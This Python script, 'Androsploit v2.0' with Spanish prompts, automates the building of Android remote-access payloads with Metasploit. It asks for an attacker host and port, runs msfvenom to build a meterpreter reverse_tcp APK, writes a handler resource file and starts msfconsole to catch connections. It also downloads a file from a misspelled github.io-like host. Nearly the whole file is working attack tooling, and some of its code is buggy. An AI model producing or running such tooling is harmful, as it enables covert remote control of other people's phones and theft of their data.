import os.path
import time
import sys
from colorama import *

init()
rj = Fore.RED
vr = Fore.GREEN
ci = Fore.CYAN
az = Fore.BLUE
am = Fore.YELLOW
r = Style.RESET_ALL

sKali = os.path.exists("/usr/")
sTermux = os.path.exists("/data/data/com.termux/")
kali = os.path.exists("/usr/share/metasploit-framework")
termux = os.path.exists("/data/data/com.termux/files/usr/opt/metasploit-framework")

def ini():
	if sKali == True:
		kali_linux()
	elif sTermux == True:
		termuxver()
	else:
		banner()
		print (rj + '\nEste script no puede ser ejecutado en tu sistema!' + r)

def banner():
	print (vr + '''				
			███████▀▀▀░░░░░░░▀▀▀███████
			████▀░░░░░░░░░░░░░░░░░▀████
			███│░░░░░░░░░░░░░░░░░░░│███
			██▌│░░░░░░░░░░░░░░░░░░░│▐██
			██░└┐░░░░░░░░░░░░░░░░░┌┘░██
			██░░└┐░░░░░░░░░░░░░░░┌┘░░██
			██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
			██▌░│██████▌░░░▐██████│░▐██
			███░│▐███▀▀░░▄░░▀▀███▌│░███
			██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
			██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
			████▄─┘██▌░░░░░░░▐██└─▄████
			█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
			████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
			█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
			███████▄░░░░░░░░░░░▄███████
			██████████▄▄▄▄▄▄▄██████████
                              Androsploit v2.0		''' + r)
	print (rj + "                      -------------------------------" + r)
	print (az + "                           Informática y Hacking   " + r)
	print (rj + "                      -------------------------------" + r)
	print (az + "                      https://informaticayhacking.com" + r)
	print (rj + "                      -------------------------------" + r)
	print (az + "                         t.me/Informática_y_Hacking  " + r)
	print (rj + "                      -------------------------------\n\n" + r)

def proceso():
	directorio = os.path.exists("Androsploit_Payloads")
	if directorio == False:
		os.system('mkdir Androsploit_Payloads')
	else:
		pass
	os.system('clear')
	print (vr + "Verificando Metasploit Framework en su sistema...\n" + r)
	time.sleep(2)
	print (ci + "Metasploit Framework " + r + "[" + vr + "OK"  + r + "]\n")
	time.sleep(2)
	banner()
	nom = input (ci + "Ingrese un nombre para su Payload" + r + rj + " >>  " + r)
	print ("")
	ques = input(ci + "Red local?" + r + " [s/n] " + rj + ">>  " + r)
	quest = ques.lower()
	if quest == 's':
		print ("")
		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
		print ("")
		port = input (ci + "Ingrese el Puerto " + r + rj + " >>  " + r)
		pport = port
	elif quest == 'n':
		print ("")
		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
		print ("")
		pport = input (ci + "Ingrese el Puerto global" + r + rj + " >>  " + r)
		print ("")
		port = input (ci + "Ingrese el Puerto local" + r + rj + " >>  " + r)
	print ("\n")
	print (am + "Generando " + nom + ".apk, por favor espere..." + r)
	time.sleep(2)
	os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > Androsploit_Payloads/{}.apk'.format(host,pport,nom))
	os.system("clear")
	banner()
	print ("")
	print (vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en Androsploit_Payloads" + r)
	auto = open('autos.rc', 'w')
	auto.write('use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nexploit'.format(host, port))
	auto.close()
	os.system("curl -LO https://Auxilus.girhub.io/database.yml")
	os.system("mkdir -p $PREFIX/var/lib/postgresql")
	os.system("initdb $PREFIX/var/lib/postgresql")
	os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
	os.system("createuser msf")
	os.system("create msf_database")
	os.system("msfdb reinit")
	os.system("clear")
	banner()
	print (vr + "Configurando msfconsole espere..." + r)
	os.system("msfconsole -r autos.rc")

def proceso_termux():
	ruta = os.path.exists('/storage/emulated/0/Androsploit_Payloads')
	if ruta == False:
		os.system('mkdir /storage/emulated/0/Androsploit_Payloads')
	else:
		pass
	os.system('clear')
	print (vr + "Verificando Metasploit Framework en su sistema...\n" + r)
	time.sleep(2)
	print (ci + "Metasploit Framework " + r + "[" + vr + "OK"  + r + "]\n")
	time.sleep(2)
	banner()
	nom = input (ci + "Ingrese un nombre para su Payload" + r + rj + " >>  " + r)
	print ("")
	ques = input(ci + "Red local?" + r + " [s/n] " + rj + ">>  " + r)
	quest = ques.lower()
	if quest == 's':
		print ("")
		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
		print ("")
		port = input (ci + "Ingrese el Puerto " + r + rj + " >>  " + r)
		pport = port
	elif quest == 'n':
		print ("")
		host = input (ci + "Ingrese su Host o IP " + r + rj + " >>  " + r)
		print ("")
		pport = input (ci + "Ingrese el Puerto global" + r + rj + " >>  " + r)
		print ("")
		port = input (ci + "Ingrese el Puerto local" + r + rj + " >>  " + r)
	print ("\n")
	print (am + "Generando " + nom + ".apk, por favor espere..." + r)
	time.sleep(2)
	os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > /storage/emulated/0/Androsploit_Payloads/{}.apk'.format(host,pport,nom))
	os.system("clear")
	banner()
	print ("")
	print (vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en /storage/emulated/0/Androsploit_Payloads" + r)
	auto = open('autos.rc', 'w')
	auto.write('use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nexploit'.format(host, port))
	auto.close()
	os.system("curl -LO https://Auxilus.girhub.io/database.yml")
	os.system("mkdir -p $PREFIX/var/lib/postgresql")
	os.system("initdb $PREFIX/var/lib/postgresql")
	os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
	os.system("createuser msf")
	os.system("create msf_database")
	os.system("msfdb reinit")
	os.system("clear")
	banner()
	print (vr + "Configurando msfconsole espere..." + r)
	os.system("msfconsole -r autos.rc")

def kali_linux():
	if kali == False:
		print (am + "Error, no se ha encontrado Metasploit Framework en su sistema " + r + rj + "[X]" + r)
	else:
		proceso()

def termuxver():
	if termux == False:
		os.system("clear")
		banner()
		print (am + "Error, no se ha encontrado Metasploit Framework en su sistema " + r + rj + "[X]" + r)
		print ("")
		elec = input(ci + "Desea Instalar Metasploit Framework?" + r + am + " [s/n] " + r + rj + ">>  " + r)
		print ("")
		if elec == "s":
			print ("")
			ver = input('Su versión de android es mayor a 5x ? [s/n]: ')
			version = ver.lower()
			if version == 's':
				print (am + "Instalando Metasploit Framework, esto puede tomar varios minutos.." + r)
				os.system("pkg install unstable-repo")
				os.system("pkg install metasploit")
				os.system("clear")
				print ("")
				print (vrf + "Verificando la instalación de Metasploit Framework en su sistema..." + r)
			elif version == 'n':
				print (am + "Instalando Metasploit Framework, esto puede tomar varios minutos.." + r)
				os.system('curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz')
				os.system('gunzip metasploit_5.0.65-1_all.deb.gz')
				os.system('dpkg -i metasploit_5.0.65-1_all.deb')
				os.system('apt -f install -y')
			else:
				print ('')
				print(rj + 'Responda s o n' + r)
			if termux == False:
				banner()
				print ("")
				print (rj + "Hubo un error durante la instalación, intente ejecutar" + r + am + " 'pkg upgrade -y'" + r)
				
			else:
				proceso_termux()
		
		elif elec == "n":
			banner()
			print ("")
			print (rj + "Se necesita Metasploit Framework para funcionar." + r)
			sys.exit()
			
		elif elec != "s" or "n":
			banner()
			print ("")
			print (am + "¡Debe ingresar una opción válida.!"+ r)
			time.sleep(2)
			ini()
	else:
		proceso_termux()
		

ini()
